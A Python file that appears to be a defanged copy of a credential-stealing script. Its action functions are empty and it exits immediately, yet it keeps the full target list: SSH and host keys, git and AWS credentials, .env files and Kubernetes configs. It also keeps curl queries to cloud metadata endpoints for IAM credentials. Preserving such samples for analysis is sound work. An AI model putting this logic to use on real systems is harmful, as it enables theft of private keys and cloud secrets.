import os

print("Original script. Don't run!")
exit(0)

def run(s):
    pass

def walk(pathes, offse, f):
    pass

def emit(s):
    pass

homes=[]

try:
    homes=[]
    for e in os.scandir('/home'):
        if e.is_dir(): homes.append(e.path)
except OSError: pass

homes.append('/root')
all_roots=homes+['/opt','/srv', '/var/www','/app','/data','/var/lib','/tmp']

run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null') 
run('printenv')

for h in homes+['/root']:
    for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']: 
        emit (h+f)
    walk([h+'/.ssh'],2, lambda fp, fn: True)

walk(['/etc/ssh'],1,lambda fp, fn: fn.startswith('ssh_host') and fn.endswith('_key'))
for h in homes+['/root']:
    for f in ['/.git-credentials','/.gitconfig']:emit(h+f)

for h in homes+['/root']:
    emit (h+'/.aws/credentials')
    emit(h+'/.aws/config')

for d in ['.', ' . . / . . ' ]:
    for f in ['.env', '.env.local', '.env.production', '.env.development', '.env.staging', '.env.test']: 
        emit (d+'/'+f)

emit('/app/.env')
emit('/etc/environment')
walk(all_roots,6, lambda fp,fn:fn in {'.env','.env.local','.env.production', '.env.development','.env.staging'})
run('env | grep AWS_')
run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')

for h in homes+['/root']:
    emit (h+'/.kube/config')

emit('/etc/kubernetes/admin.conf')
emit('/etc/kubernetes/kubelet.conf')
emit('/etc/kubernetes/controller-manager.conf')